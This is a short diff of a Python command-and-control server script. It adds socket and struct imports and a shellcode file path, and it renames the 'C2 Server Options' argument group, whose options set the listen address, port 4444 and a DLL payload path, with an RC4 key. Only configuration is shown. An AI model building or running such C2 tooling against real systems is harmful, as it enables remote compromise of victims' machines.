@@ -5,10 +5,13 @@ import os
 import shlex
 import readline
 import argparse
+import socket
+import struct
 
 HOST = "0.0.0.0"
 PORT = 4444
 DLL_PATH = "payload.dll"
+SHELLCODE_PATH = 'shellcode.bin'
 RC4_KEY = b"StummKey2026"
 
 MAGIC_BYTE = 0x53
@@ -25,11 +28,11 @@ parser = argparse.ArgumentParser(
     formatter_class=argparse.RawTextHelpFormatter
 )
 
-# C2 server
-c2_group = parser.add_argument_group('C2 Server Options')
-c2_group.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 listen address (default: {HOST})')
-c2_group.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
-c2_group.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')
+# General configuration
+config = parser.add_argument_group('General configuration')
+config.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 listen address (default: {HOST})')
+config.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
+config.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')
 
 args = parser.parse_args()
 
